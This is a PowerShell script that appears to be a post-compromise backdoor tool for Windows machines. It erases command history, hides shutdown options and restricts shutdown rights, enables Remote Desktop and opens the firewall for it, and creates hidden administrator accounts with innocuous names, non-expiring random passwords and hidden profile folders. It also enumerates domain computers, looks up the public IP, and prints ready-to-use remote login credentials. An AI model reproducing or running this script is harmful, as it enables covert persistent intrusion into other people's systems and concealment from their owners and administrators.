Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

$currentOnly = Read-Host "[!] are you need do this only current user? "

Clear-Host

Function Generate-Password($length = 30) {
    $lower = "abcdefghijklmnopqrstuvwxyz".ToCharArray()
    $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
    $digits = "0123456789".ToCharArray()
    $symbols = "!@#$%+=-".ToCharArray()
    $all = $lower + $upper + $digits + $symbols
    $password = @()
    $password += $lower | Get-Random
    $password += $upper | Get-Random
    $password += $digits | Get-Random
    $password += $symbols | Get-Random
    $remaining = $length - 4
    $password += 1..$remaining | ForEach-Object { $all | Get-Random }
    -join ($password | Get-Random -Count $password.Count)
}

$tempDir = "$env:TEMP\pol_temp"
$configFile = "$tempDir\secpol.inf"
$dbFile = "$tempDir\secpol.sdb"

$currentUser = "$env:USERDOMAIN\$env:USERNAME"
$adminSID = "S-1-5-32-544"      # SID for "Administrators" group
$rdpUsersSID = "S-1-5-32-555"   # SID for "Remote Desktop Users" group

$tempDir = "$env:TEMP\SecEditTemp"
$configFile = "$tempDir\secedit.inf"
$dbFile = "$tempDir\secedit.sdb"

# Get group names from SIDs
$adminGroupName = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroupName = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]

# Create temporary directory
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# Export current security policy
secedit /export /cfg $configFile | Out-Null

# Load config file content
$lines = Get-Content $configFile
$linesList = [System.Collections.Generic.List[string]]::new()
$linesList.AddRange($lines)

# Find the [Privilege Rights] section
$privRightsIndex = $linesList.IndexOf("[Privilege Rights]")
if ($privRightsIndex -eq -1) {
    Write-Error "The [Privilege Rights] section was not found."
    exit
}

# Search for existing SeShutdownPrivilege entry
$shutdownMatch = $linesList | Select-String "^SeShutdownPrivilege"

if ($shutdownMatch) {
    $shutdownLineIndex = $shutdownMatch[0].LineNumber - 1
    $linesList[$shutdownLineIndex] = "SeShutdownPrivilege = *$adminSID"
} else {
    $linesList.Insert($privRightsIndex + 1, "SeShutdownPrivilege = *$adminSID")
}

# Save changes
$linesList | Set-Content $configFile -Encoding Unicode

# Apply the updated policy
secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet | Out-Null

# Clean up temporary files
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutdown" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord > $null

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null
Get-NetFirewallRule | Where-Object { $_.Name -like "*RemoteDesktop*" } | Enable-NetFirewallRule > $null
Set-Service -Name TermService -StartupType Automatic > $null
Start-Service TermService > $null

$users = @("HomeGroupUser", "Other user")
$passwords = @{}
$defaultAccountDescription = "A user account managed by the system."

try {
    $defaultAccount = Get-LocalUser -Name "DefaultAccount" -ErrorAction Stop
    $defaultAccountDescription = $defaultAccount.Description
} catch {}

if ($currentOnly -eq '1') {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    $password = Generate-Password
    net user "$user" $password
    $passwords[$user] = $password
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
    New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
    $userFolder = "$env:SystemDrive\Users\$user"
    if (-not (Test-Path $userFolder)) {
        try {
            Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop > $null
            Sleep 3
            attrib +h +s "$userFolder"
        } catch {
            New-Item -Path $userFolder -ItemType Directory -Force > $null
            Sleep 3
            attrib +h +s "$userFolder"
        }
    } else {
        attrib +h +s "$userFolder"
    }
} else {
    foreach ($user in $users) {
        $password = Generate-Password
        try {
            net user "$user" $password > $null 2>&1
            net user "$user" $password /domain > $null 2>&1
            $passwords[$user] = $password
            net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
            net user "$user" /expires:never > $null 2>&1
            net user "$user" /active:yes > $null 2>&1
            Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
            New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null
            $isDomainUser = ($user -like "*\*")
            $userForGroup = if ($isDomainUser) { $user } else { "$env:COMPUTERNAME\$user" }
            cmd /c "net localgroup `"$adminGroupName`" `"$userForGroup`" /add" > $null 2>&1
            cmd /c "net localgroup `"$rdpGroupName`" `"$userForGroup`" /add" > $null 2>&1
            $userFolder = "$env:SystemDrive\Users\$user"
            if (-not (Test-Path $userFolder)) {
                try {
                    Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop > $null
                    Sleep 3
                    attrib +h +s "$userFolder"
                } catch {
                    New-Item -Path $userFolder -ItemType Directory -Force > $null
                    Sleep 3
                    attrib +h +s "$userFolder"
                }
            } else {
                attrib +h +s "$userFolder"
            }
        } catch {}
    }
}

Write-Host "`n=== all ip adapters ==="
$localIP = $null
Get-NetIPAddress | Where-Object { $_.IPAddress -match '\d+\.\d+\.\d+\.\d+' } | ForEach-Object {
    Write-Host $_.InterfaceAlias":" $_.IPAddress
    if (-not $localIP) { $localIP = $_.IPAddress }
}

try {
    $publicIP = (Invoke-RestMethod -Uri "https://checkip.amazonaws.com").Trim()
    if ($publicIP -notmatch '^\d{1,3}(\.\d{1,3}){3}$') {
        $publicIP = "UNKNOWN"
    }
} catch {
    $publicIP = "UNKNOWN"
}

try {
    $rdpPortReg = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber"
    $rdpPort = $rdpPortReg.PortNumber
} catch {
    $rdpPort = 3389
}

Write-Host "`n=== domain ==="
try {
    $compSys = Get-WmiObject Win32_ComputerSystem
    if ($compSys.PartOfDomain) {
        Write-Host "domain: $($compSys.Domain)"
        try {
            $domainComputers = Get-ADComputer -Filter * -Property Name | Select-Object -ExpandProperty Name
            Write-Host "computers in domain:"
            $domainComputers | ForEach-Object { Write-Host " - $_" }
        } catch {
            Write-Host "error get list of computers on domain"
        }
    } else {
        Write-Host "workgroup: $($compSys.Workgroup)"
    }
} catch {
    Write-Host "could not determine domain or workgroup information"
}

Write-Host "`n=== whoami ==="
whoami

Write-Host "`n=== details ==="
if ($publicIP -eq "UNKNOWN") {
    Write-Host "[!] Public IPv4 address could not be determined."
}

if ($currentOnly -eq '1') {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
} else {
    foreach ($user in $users) {
        if ($passwords.ContainsKey($user)) {
            Write-Host "$publicIP`:$rdpPort@$user;$($passwords[$user])"
        }
    }
}
